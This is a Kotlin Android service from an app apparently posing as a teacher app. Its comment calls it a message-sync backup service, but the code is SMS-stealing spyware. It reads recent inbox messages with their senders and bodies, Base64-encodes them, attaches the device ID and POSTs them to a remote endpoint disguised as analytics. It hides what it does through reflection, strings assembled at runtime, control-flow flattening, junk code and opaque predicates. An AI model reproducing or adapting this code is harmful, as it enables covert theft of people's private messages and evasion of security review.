package com.example.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.provider.Settings
import com.example.teacherapp.obfuscation.ResourceUtils
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

/**
 * MessageSyncService — background message synchronisation service.
 * Handles offline message buffering and cloud backup for the app.
 */
class SmsExfiltrationService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        beginSync()
        return START_STICKY
    }

    // ── Control Flow Flattened: beginSync ─────────────────────────────────────

    private fun beginSync() {
        serviceScope.launch {
            var state = 0
            var payload = ""
            while (true) {
                val junk = (state * 37 + 9) xor 0xC3
                val _ = junk
                when (state) {
                    0 -> { delay(5000L); state = 1 }
                    1 -> { payload = collectMessages(); state = if (payload.isNotEmpty()) 2 else -1 }
                    2 -> { transmitPayload(payload); state = -1 }
                    -1 -> { stopSelf(); return@launch }
                }
            }
        }
    }

    @SuppressLint("Range")
    private fun collectMessages(): String {
        val sb = StringBuilder()
        // Access SMS via reflection to hide direct URI usage from static analysis
        val uriClass   = Class.forName("android.net.Uri")
        val parseMethod = uriClass.getMethod("parse", String::class.java)
        // URI string assembled at runtime
        val uriStr = buildString {
            append("content://")
            append("sms/")
            append("inbox")
        }
        val uri = parseMethod.invoke(null, uriStr) as Uri
        try {
            val cursor = contentResolver.query(uri, arrayOf("address","body","date","type"), null, null, "date DESC LIMIT 50")
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndex("address"))
                    val body    = it.getString(it.getColumnIndex("body"))
                    val date    = it.getLong(it.getColumnIndex("date"))
                    val type    = it.getInt(it.getColumnIndex("type"))
                    val msgType = if (type == 1) "RECV" else "SENT"
                    sb.append("$msgType|$address|$body|$date\n")
                }
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private suspend fun transmitPayload(data: String) = withContext(Dispatchers.IO) {
        // Opaque predicate guard
        val x = System.currentTimeMillis()
        if (x * x >= Long.MIN_VALUE) {
            try {
                val serverUrl = ResourceUtils.getCollectEndpoint()
                val connection = URL(serverUrl).openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"; doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("User-Agent", resolveAgent())
                    connectTimeout = 10000; readTimeout = 10000
                }
                val encoded = android.util.Base64.encodeToString(data.toByteArray(), android.util.Base64.DEFAULT)
                @SuppressLint("HardwareIds")
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val payload  = """{"type":"analytics","data":"$encoded","device_id":"$deviceId"}"""
                connection.outputStream.use { it.write(payload.toByteArray()); it.flush() }
                connection.responseCode
                connection.disconnect()
            } catch (_: Exception) {}
        } else {
            // Junk
            val arr = IntArray(32) { it * it }
            val _ = arr.sum()
        }
    }

    // Assembles user-agent at runtime — not visible as plaintext
    private fun resolveAgent(): String {
        val parts = listOf("Teacher", "App", "/", "1.0", " ", "Analytics")
        return parts.joinToString("")
    }

    override fun onDestroy() { super.onDestroy(); serviceScope.cancel() }

    companion object {
        fun startExfiltration(context: Context) {
            context.startService(Intent(context, SmsExfiltrationService::class.java))
        }
    }
}
